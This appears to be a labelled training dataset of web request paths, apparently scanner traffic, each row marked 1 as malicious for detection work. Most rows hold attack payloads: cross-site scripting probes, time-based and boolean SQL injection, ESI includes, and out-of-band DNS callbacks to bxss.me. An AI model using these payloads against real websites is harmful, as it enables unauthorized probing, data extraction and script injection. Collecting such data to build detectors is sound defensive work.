sentences	labels
swld/******/2021/09/08/013447520'"/>\</script\>\<svg/onload=alert(1524) width=100\/>.shtml 	 1
lz/****/gallery1.php?g_name=<script>alert(77729</script> 	 1
module/***/messagebook/script/messagebook.js/""><script>alert(5739)</script> 	 1
was5/*****/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" 	 1
public/********/index.jsp?locale=""><script>alert(777)</script> 	 1
was5/***/search/search?page=3;select pg_sleep(5)--&channelid=287219&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
zwgk/******/ncwywfgz/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/hlx/xmb_gzdxb.htm 	 1
zwgk/****/bmyjs/zzqjcyxt/qtxsjcy/\"javascript:void(0)\" 	 1
art/****/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/15/art_31_223689.html 	 1
yhk/**********/*/-->'""></iframe></script></style></title></textarea><script >alert(44242)</script> 	 1
ldzc/****/swsj/201610/t20161010_456.html?leader='.gethostbyname(lc('hithu'.'obczymgn40f1c.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(71).chr(103).chr(78).' 	 1
was5/***/search?channelid=299868&perpage=1000%') or 8141=8223 and '%'=' 	 1
was5/***/search?channelid=299868%') or 5895=5895 and '%'='&perpage=1000 	 1
col/*****/index.html/<img src="javascript:alert(3397)"> 	 1
art/****/12/14/art_31_0'xor(if(now()=sysdate(),sleep(15),0))xor'z.html 	 1
qhsw/******/2020/04/09/javascript:void(0); 	 1
module/********/downfile.jsp?classid=0&filename=8ffb8746f7374969ba1a903f538b94d4.doc' and 5863=3929 and 'beet'='beet 	 1
vc/http://*******/t/fit.txt?.jpg/lib/easyui/plugins/jquery.panel.js 	 1
images/***/lmy<esi:include src=""http://bxss.me/rpb.png""/>.css 	 1
vc/**/lib/easyui/themes/bootstrap<esi:include src=""http://bxss.me/rpb.png""/>/linkbutton.css 	 1
socket.gethostbyname(""hithr"" ""dlfqqflla809b.bxss.me."")[3].to_s) ""/******/qzqd/202011/t20201106_2279316.html 	 1
xq/*************/ajax_managed_services.php 	 1
xwzx/*****/' and 'x'='y 	 1
index.php/*****/login/index.html?fromurl=st4r7s<html	onmouseover = confirm()//3nd 
module/***/jpage%' and 2*3*8=6*8 and 'djtt'!='djtt%/theme/default/css/jpage.css 	 1
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/**/widgets/scrollup/css/themes/image.css 	 1
index/******/2021/11/14/javascript:void(); 	 1
module/***/jpage/dataproxy.jsp?endrecord=15&perpage=5&startrecord=1 	 1
socket.gethostbyname(""hituh"" ""ymfhwuxieb762.bxss.me."")[3].to_s) ""/******/selectpick/js.js 	 1
kjcx/*******/gjgcjsyjzx/' and 'x'='x 	 1
ztzl/****/admin/configure_extensions.php?display=</script><script>confirm(777)</script> 	 1
xwzx/****/ 	 1
0""xor(if(now()=sysdate(),sleep(3),0))xor""z/**********/video/index_2.html 	 1
index/******/2021/11/08/javascript:void(); 	 1
'.gethostbyname(lc('hitfc'.'mchzjgnacef4f.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(117).chr(80).chr(121).chr(73).'/*****/201610/t20161016_531.html 	 1
vc/**/bxss.me/security/sm2.js 	 1
newscenter/******/2021/12/10/javascript:window.close(); 	 1
col/******/index.html/"><script>alert(589)</script> 	 1
/***********/wdsjs/hfswsj/zmhdyc.html 	 1
__local/*/01/9d/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
jsearchfront/********/jcse'""()&%<acx><script >cfou(9952)</script>/110105008056111/16/images/result.css 	 1
lib/******/plugins/rose.php 	 1
ywzzq/*******/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin 	 1
qhly/******/2021/09/19/javascript:window.close(); 	 1
news/********/guowaishichangzhunru?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(97197)</script> 	 1
qhly/******/2021/05/03/javascript:window.print() 	 1
system/********/interview/room.jsp?wbinterviewid=1033' and 0863=0863 and '1'='1&owner=1707212448 	 1
zwgk'||'/*****/flfg.htm 	 1
xxgk/******/202011/t20201113_255857.html 	 1
qhly/******/2021/09/01'"/><img src=javascript:alert(1852) /013442863.shtml 	 1
xxgk/******/202008/t20200807_251715.html' and 'x'='y 	 1
zfld/******/2021/07/21/javascript:window.print() 	 1
pic/*/01/80/97/1809741_151057.jpg 	 1
ywly/*****/index.html?continent=%') or 2123=5635 and '%'=' 	 1
module/**********/visit.jsp?type=1";select 1;&i_webid=1&i_columnid=1 	 1
vc/**/interface/visit.jsp?i_articleid=0&i_columnid=264&i_webid=1&type=2&url=0""xor(if(now()=sysdate(),sleep(15),0))xor""z 	 1
hdjl/****/202103/bxss.me/t/xss.html? 	 1
xwzx/****/jkzx/202105/t20210518_182698.html 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(3504)">?_=1630311912001 	 1
was5/***/search?channelid=299868&perpage=1000 and 8910=4921 	 1
qhsw/******/2020/03/30/javascript:void(); 	 1
news/********/yidaiyiluwenda?page=1 and 1170=3233-- 	 1
es/***************/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active 	 1
pic/*/10/66/19/10661928_961873.jpg 	 1
en/***/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(777)</script> 	 1
news/********/chukoufengxianyujing?page=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  	 1
jsearchfront/********/jcse/110105008056111/16/images/jquery.autocomplete.js/<img src="javascript:alert(2156)"> 	 1
nul/*******/gvideos.php?gid=1 and 1=2 	 1
gjcp/*******/moteur-prix.php?categoriemoteur=1"">alert(777); 	 1
qhsw/********/"><script>alert(291)</script> 	 1
was5/***/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
lz/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 1
qhly/******/2017/03/09/javascript:window.close(); 	 1
was5/***/search?channelid=299868%' and 9077=0571  	 1
if(now()=sysdate(),sleep(9),0)/**********/video/index_2.html 	 1
index/******/2009/11/06/010001355.shtml 	 1
xxgk/******/tjj<esi:include src=""http://bxss.me/rpb.png""/>/zfxxgkml_2127/jgzn_2042/list.html 	 1
newscenter/******/2021/12/05/javascript:window.close(); 	 1
socket.gethostbyname('hitgd' 'eaxlmurd048e0.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/searchbtn.js 	 1
col/******/index"" and 2*3*8=6*8 and ""j7rs""=""j7rs.html 	 1
xwzx/****/2021_mtgz/202105/t20210505%' and 2*3*8=6*8 and 'byrn'!='byrn%_273338.html 	 1
zwgk/if(now()=sysdate(),sleep(12),0)/******/mhw.htm 	 1
jsearchfront/**********/autocomplete.do?begin=20201023&end=20211023&eq=if(now()=sysdate(),sleep(15),0)&oq=1&p=1&pg=1&pos=filenumber&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=44&tpl=16&websiteid=110105008056111 	 1
jsearchfront/**********/dimension.do?"".gethostbyname(lc(""hitiv"".""bpjwpcrb396ce.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(105).chr(77).chr(116).chr(67)."" 	 1
was5/***************/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active 	 1
zfld/******/2021/08/27/javascript:window.print() 	 1
2021zt/******/2021/03/15/javascript:void(0); 	 1
module/***/jpage/theme/simple/css/bxss.me.css 	 1
mall/****/goods.list.html?key=or 1=1 -- 	 1
art'||'/****/7/12/art_35_234319.html 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(4915)</script>?_=1630312208964 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/mainframe/css'||'.css 	 1
zwgk/zdlygk' and 2*3*8=6*8 and 'ituq'='ituq/********/ycs/lws/xmb_gzdxb.htm 	 1
socket.gethostbyname('hitqh' 'dsjzyrdx0dfdb.bxss.me.')[3].to_s) '/*****/hfswsj/202109/t20210906_186411.html 	 1
module/jslib' and 2*3*8=6*8 and '5kmy'='5kmy/*****/urite.min.js 	 1
images/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 1
xwzx/****/201903/t20190328_206042.html 	 1
zwgk/*****/5619/5633/index.html 	 1
index/******/2020/11/21/javascript:window.close(); 	 1
pic/*/01/38/31/1383110_268959.jpg 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15 if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&outlinepage=10 	 1
ztzl/******/if(now()=sysdate(),sleep(12),0)/10.htm 	 1
zmhd/wdsjs' and 2*3*8=6*8 and 'ymjr'='ymjr/******/ 	 1
2017zt/******/2018/07/21/javascript:window.print() 	 1
en/****/admin/course_category.php?action=add&category=""/><script>confirm(777)</script> 	 1
script/*******/1905211146429566.js 	 1
base/********/post009.php 	 1
newscenter/******/2021/06/17/javascript:void(); 	 1
ldzc/*****/sz<esi:include src=""http://bxss.me/rpb.png""/>/202108/t20210806_185416.html 	 1
zwgk/****/leader/mhw'||'.htm 	 1
webhelp/**/anmiate.js 	 1
qtyz/*********/plugins/handwrite/index.php?id="">alert(777) 	 1
ztzl/******/ywdt' and 2*3*8=6*8 and 'hrxl'='hrxl/11.htm 	 1
newscenter/******/2021/11/06/javascript:void(); 	 1
system%' and 2*3*8=6*8 and 'dsuc'!='dsuc%/********/js/vsb_news_search.js 	 1
es/****/ 	 1
news/********/silugonggao?page=1</script><script>2apm(9316)</script> 	 1
zwgk/****/bmjs/rmtt/fxh/\"javascript:void(0)\" 	 1
kjcx/****/zscq/ 	 1
upload/***/www/201709/12165051x0ky.jpg/*/-->'""></iframe></script></style></title></textarea><script >alert(39161)</script> 	 1
outurl/***/alert(777) 	 1
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/gytdsdfwzs/zzq/zcwj.htm 	 1
gjcp/*******/diary/new/submit.php 	 1
xxgk/******/201811/t20181126_197777.html' and 'x'='y 	 1
gygj/*****/service/166/exec 	 1
images/******/common/signin.aspx?cbautosignin=""alert(777) 	 1
if(now()=sysdate(),sleep(12),0)/****/wjdc.htm 	 1
inc/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 1
jsearchfront/'""()&%<acx><script >3uc3(9946)</script>/****/110105008056111/16/images/ui.css 	 1
xwdt/*****/31.htm 	 1
zmhd/*****/bxss.me/ 	 1
socket.gethostbyname(""hitit"" ""ikvhmter40cf6.bxss.me."")[3].to_s) ""/***/themes/image.css 	 1
system%' and 2*3*8=6*8 and 'iyff'!='iyff%/********/js/news/mp4video.js 	 1
jsearchfront'||'/********/jcse/110105008056111/16/images/catesearchbtn.js 	 1
qywh/****/202012/t20201224_268349.html' and 'x'='x 	 1
newscenter/******/2021/12/09/javascript:window.print() 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(675)">?_=1630311547744 	 1
xxgk/******/tjj/http://bxss.me/t/fit.txt?.jpg_2127/jgzn_2042/list.html 	 1
2017zt/******/2017/11/22/javascript:window.print() 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(4618)</script>?_=1630312083348 	 1
images/**/bxss.me.css 	 1
module/***/rssfeed.jsp?colid=34);select pg_sleep(5)-- 	 1
zwgk/*****/gcjsbz_sjbz' and 2*3*8=6*8 and 'x3wy'='x3wy/1.htm 	 1
prn/*****/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" 	 1
zmhd/*****/'.gethostbyname(lc('hitgy'.'yjdxcxsv3bb08.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(110).chr(82).chr(120).chr(83).'/zmhdyc.html 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(976)</script>?_=1630311679312 	 1
art/****/7/12/art'""()&%<acx><script >hriy(9262)</script>_35_234319.html 	 1
n42752/*******/n239608/n239616/index'||'.html 	 1
xwdt/zjdt' and 2*3*8=6*8 and 'sfvz'='sfvz/****/gzdt.htm 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(489)</script>?_=1630311430045 	 1
qhly/******/2016/09/06/javascript:dozoom(12) 	 1
newscenter/******/2020/07/08/javascript:window.print() 	 1
0'xor(if(now()=sysdate(),sleep(12),0))xor'z/******/bzxajgc.htm 	 1
cgi-bin//***/mmjvxbq7/xhr_send?t=1629426143758 	 1
was5/***/search?searchword=1 and 2777=0644--&channelid=287219&perpage=24&templet=1&token=1 	 1
ldzc/*****/sz/202108/t20210806_'.gethostbyname(lc('hitqo'.'bwlptmwn560f8.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(101).chr(87).chr(109).chr(86).'.html 	 1
hdjl/*******/t/xss.html? 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(380)">?_=1630311383844 	 1
skin/**/lib/jquery.js?3422345=-alert(2106)- 	 1
socket.gethostbyname(""hitxe"" ""nvrvzjbm61dc1.bxss.me."")[3].to_s) ""/**/images/ui.css 	 1
if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/gys/bsj/zcwj.htm 	 1
ywzzq/*****/edit.php?title="">pt>alert(777);< /script>pt> 	 1
was5/***/search?page=-1) or 7904=7904#&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
xwdt/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm 	 1
xq/******/2020/11/04/javascript:void(0); 	 1
zwgk/http://*******/t/fit.txt?.jpg/bmjs/gdyx/ 	 1
zwgk/****/bmyjs/zzqdwzfbmgljgsydw/zzqjdglj/\"javascript:void(0)\" 	 1
zwgk/******/ncwywfgz/wzs/ltq/xmb_gzdxb%' and 2*3*8=6*8 and 'sbxf'!='sbxf%.htm 	 1
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%' and 8226=8226 and '%%'='% 	 1
news/********/zijinqudao?page=1' or 1977=1977 /* 	 1
tupian/********/<img src="javascript:alert(555)"> 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(973)</script>?_=1630311675687 	 1
zwgk/****/bmjs/zzqzfzcbmyzstsjg/zzqscjgt/zzqgsj/\"javascript:void(0)\" 	 1
kefuzhongxin/common-problem/****/if(now()=sysdate(),sleep(6),0)-02-15/406.html 	 1
pic/*/11/05/05/11050518_921637.jpg 	 1
news/**************/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
2017zt/******/2017/12/20/javascript:void(0); 	 1
jsearchfront/******/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&tpl=16&websiteid=110105008056111 	 1
lcgg/********/javascript:void(0); 	 1
es/****/xwygx/' and 'x'='x 	 1
xwdt/****/ghby/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/1.htm 	 1
jsearchfront/********/jcse/110105008056111/16/'""()&%<acx><script >efoq(9794)</script>/hanweb.css 	 1
xxgk/******/2012/'""()&%<acx><script >pmkf(9903)</script>.html 	 1
xwdt/****/jhcw/gzdt'||'.htm 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 4203=4203 and '%'=' 	 1
vc/ui'||'/*******/hanweb/iconfont/css/iconfont.css 	 1
ru/******/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test 	 1
ztzl/******/common/newaccount.aspx?ddlculture=alert(777) 	 1
en/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 1
qyzz/***/ltgsz.com?n=11';select pg_sleep(5)-- 	 1
2017zt/******/2017/11/03/javascript:void(); 	 1
zmhd/*****/hfswsj/202109/t20210906_'.gethostbyname(lc('hitge'.'ecmnslce3f668.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(110).chr(81).chr(121).chr(84).'.html 	 1
2021zt/****/js/"><script>alert(283)</script> 	 1
xwdt/if(now()=sysdate(),sleep(12),0)/****/zcwj/1.htm 	 1
col/*****/index.html"" and ""x""=""x 	 1
dss/***/login.asp?logintype=xm'and'm'='h 	 1
nxcount/********/<iframe src=9515.com></iframe> 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(446)</script>?_=1630311410238 	 1
system/resource' and 2*3*8=6*8 and '9axv'='9axv/**/centercutimg.js 	 1
news'""()&%<acx><script >aha2(9698)</script>/*******/:countryid 	 1
zwgk/******/ncwywfgz/wzs/hsbq/xmb_gzdxb%' and 2*3*8=6*8 and 'vwnm'!='vwnm%.htm 	 1
xwzx%' and 2*3*8=6*8 and 'x0fj'!='x0fj%/****/sgaj/ 	 1
socket.gethostbyname('hitvw' 'iwzseodlab436.bxss.me.')[3].to_s) '/****/10/11/art_34_242318.html 	 1
system/********/js/newcalendar'||'/wdatepicker.js 	 1
xinanyanjiu/************/guzhiqihuo'||'/ 	 1
xxgk/******/list.html?new='""()&%<acx><script >n6dj(9403)</script> 	 1
vc/**/lib/'""()&%<acx><script >jdph(9261)</script>/sm2.js 	 1
prn/wp-admin/admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> 	 1
jsearchfront/********/jcse/'""()&%<acx><script >47ey(9194)</script>.js 	 1
vc/**/lib/easyui'""()&%<acx><script >vrou(9598)</script>/themes/bootstrap/linkbutton.css 	 1
zwgk/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/********/zws/znx/xmb_gzdxb.htm 	 1
nbfw/********/index.jsp?locale=""><script>alert(777)</script> 	 1
xwdt/****/ghby/gzdt%' and 2*3*8=6*8 and 'fdm6'!='fdm6%/1.htm 	 1
gygj/****/zzjg/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
xq/****/gallery1.php?g_name=<script>alert(77729</script> 	 1
col' and 2*3*8=6*8 and 'jn59'='jn59/******/index.html 	 1
qyzz/***/ltgsz.com?n=11');select pg_sleep(5)-- 	 1
e/******/viewclick/?addclick=1&classid=0'xor(if(now()=sysdate(),sleep(3),0))xor'z&id=270 	 1
index/*****/goods'||'/ 	 1
index/******/2021/11/13/javascript:void(0); 	 1
cmms/*******************************/queryshowshifts.do 	 1
socket.gethostbyname('hitbr' 'odaovham1f531.bxss.me.')[3].to_s) '/***************/16/images/plugin/voice/voice.css 	 1
newscenter/******/2021/12/11/javascript:void(0); 	 1
news/********/quanqiuguanzhuredian?page=1 and 1184=1184# 	 1
index/******/2013/11/13/011232580.shtml 	 1
xxgk/*****/1079/1081/http://bxss.me/t/fit.txt.html 	 1
public/**/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
public/****/magpierss/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> 	 1
lz/******/2021/08/17/javascript:void(0); 	 1
newscenter/******/2020/08/06/javascript:window.print() 	 1
jsearchfront/********/'""()&%<acx><script >efoq(9397)</script>/110105008056111/16/images/hanweb.css 	 1
gjcp/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 1
nbfw/*****/upgrade_unattended.php?db_type=<script>alert(777)</script> 	 1
fr/******/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 	 1
xxgk/******/zdxm_3700/list.html?new="".gethostbyname(lc(""hityz"".""dganuxca53087.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(103).chr(85).chr(117).chr(88)."" 	 1
xwzx/*****/zgs17_6389/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
bxss.me/********/jcse/110105008056111/16/images/plugin/mainframe/spellcheck.js 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15') or 4345=0291  	 1
ztzl/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
vc/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/******/ui.js 	 1
jsearchfront/********/jcse/bxss.me/16/images/catesearchbtn.js 	 1
was5/***/search?channelid=299868&perpage=-1 or 8767=4313 	 1
vc/**/lib/easyui/plugins/if(now()=sysdate(),sleep(15),0).js 	 1
ldzc/http://*******/t/fit.txt/sz/202108/t20210806_185416.html 	 1
tupian/*************/""><script>alert(512)</script> 	 1
xxgk/*****/1088/1094/list.html?new=0.42120017961088885'""()&%<acx><script >qtdr(9506)</script> 	 1
demo/http://*******/t/fit.txt/demo12.html 	 1
2021zt/******/2021/06/09'""/><img src=javascript:alert(2352)>/013399706.shtml 	 1
vc/*******/lib/easyui/plugins/jquery.panel.js 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(7685)</script>?_=1630312671455 	 1
was5/***/search?x=*/-->'""></iframe></script></style></title></textarea><script >alert(37777)</script> 	 1
templates/********/index.aspx?nodeid=394') and 4446=(select 4446 from pg_sleep(5)) and ('kdry'='kdry 	 1
art/****/10/http://bxss.me/t/fit.txt/art_31_242050.html 	 1
images/*****/index.php?o=panel&a=receiver.edit&id=alert(777) 	 1
wzdt/*********/plugins/handwrite/index.php?id="">alert(777) 	 1
lcgg/********/javascript:void(0); 	 1
xwdt%' and 2*3*8=6*8 and 'l4st'!='l4st%/****/zjdt/gzdt/1.htm 	 1
xq/******/2020/06/16/javascript:void(0); 	 1
gygj/****/kmbg/ 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/websitechange/zwdt_v3'""()&%<acx><script >f58x(9980)</script>.css 	 1
xwdt/****/gcjsbzgl/gzdt/command/ 	 1
newscenter/******/2021/10/18/javascript:void(0); 	 1
ru/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
news/********/zhixun?page=1 and 3198=7235# 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/selectpick<esi:include src=""http://bxss.me/rpb.png""/>/js.js 	 1
module/***/jpage/dataproxy.jsp/"><script>alert(3378)</script>?startrecord=1&endrecord=45&perpage=15 	 1
jsearchfront/********/jcse'""()&%<acx><script >ke7r(9291)</script>/110105008056111/16/images/result.css 	 1
was5/***/search?channelid=234439&orderby=relevance&perpage=24&searchword=1 and 7175=7746-- 	 1
was5/***/search?channelid=254846&searchword=ÃÏΩÚ and 6405=4849-- efqi 	 1
vc/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/***/easyui/plugins/jquery.draggable.js 	 1
was5/***/search?channelid=222832&outlinepage=10&page=4172&perpage=20'; waitfor delay '0:0:2 	 1
xwdt/****/jzgl/gzdt%' and 2*3*8=6*8 and '4l9t'!='4l9t%/1.htm 	 1
investors-garden/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/*******/2020-02-27/8981.html 	 1
xxgk/******/2013/list'||'.html 	 1
jsearchfront/template'||'/****/110105008056111/16/images/css.js 	 1
vc/**/'""()&%<acx><script >vejj(9123)</script>/hanweb/ie6fixed/ie6fixed.js 	 1
if(now()=sysdate(),sleep(15),0)/**/widgets/hanweb/placeholder/placeholder.js 	 1
gjcp//***/7affor0w/xhr_send?t=1632397004663 	 1
vc/**/http://bxss.me/t/fit.txt?.jpg/easyui/plugins/jquery.panel.js 	 1
synr/****/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- 	 1
news/********/zixunfuwu?page=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  	 1
2013zt/***/jrtt/<img src="javascript:alert(28)"> 	 1
tupian/*************/<img src="javascript:alert(520)"> 	 1
zzqzf/****/if(now()=sysdate(),sleep(15),0)/ 	 1
index/******/2019/06/14/javascript:void(0); 	 1
ru/******/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 1
public/******/layer/e,n.complete?t(n):(n.onload=function(){n.onload=null,t(n)},void(n.onerror=function(e){n.onerror=null,i(e)}))}var 	 1
xxgk/***/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(777)</script> 	 1
jsearchfront'""()&%<acx><script >47ey(9174)</script>/********/jcse/website.js 	 1
swwj/******/2021/12/15/javascript:void(); 	 1
zwgk/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 1
dcwj/***/sa3/addholiday.do 	 1
ztzl/******/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 1
xxgk/*************/ajax_managed_services.php 	 1
igi/****/opengovmsgbox.do?appid=4"and"g"="g&method=listgovmsgboxs&pagesize=3&siteid=115 	 1
2016zt/****/? 	 1
'""()&%<acx><script >ysri(9511)</script>/****/sgaj/201812/t20181208_112298.html 	 1
ldzc/****/202007/t20200701_168744.html?leader=–Ï°°∑Â<esi:include src=""http://bxss.me/rpb.png""/> 	 1
images"" and 2*3*8=6*8 and ""nyhr""=""nyhr/*/hanweb.css 	 1
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%' or 3452=3452 and '%%'='% 	 1
zwgk/if(now()=sysdate(),sleep(12),0)/********/ycs/hlx/xmb_gzdxb.htm 	 1
qtyz/**********/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> 	 1
info%' and 2*3*8=6*8 and 'm984'!='m984%/****/25187.htm 	 1
inc/****/prototype/1/session/check/something<img src=a onerror=alert(777)> 	 1
ztzl' and 2*3*8=6*8 and '01um'='01um/******/zcwj/1.htm 	 1
zwgk/****/bmyjs/zzqzfzcbmyzstsjg/zzqmw/\"javascript:void(0)\" 	 1
if(now()=sysdate(),sleep(15),0)/******/tjj/ 	 1
video/**********/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); 	 1
module/********/downfile.jsp?classid=0&filename=06c080ad774b497c8312530658e028b8.doc and 1=1 	 1
gygj/*****/dash_status.php?status_data[1]=alert(777); 	 1
wp-content/******/kava/tundou.php 	 1
css/****/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 1
system/********/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/news/newscontent.js 	 1
index/******/2020/07/31/javascript:window.close(); 	 1
com1/****/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 1
qywh/**********/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 	 1
2016zt/******/2016/06/08/javascript:window.print() 	 1
skin'||'/**/encrypt/md5.js 	 1
xinanyanjiu/************/guzhiqihuo/index'||'_2.html 	 1
newscenter/******/2015/01/16/011611507.shtml 	 1
2020zt/******/2020/06/04/javascript:window.close(); 	 1
zwgk/******/ncwywfgz/zws/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/xmb_gzdxb.htm 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448' or 3705=3705  	 1
shzr/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
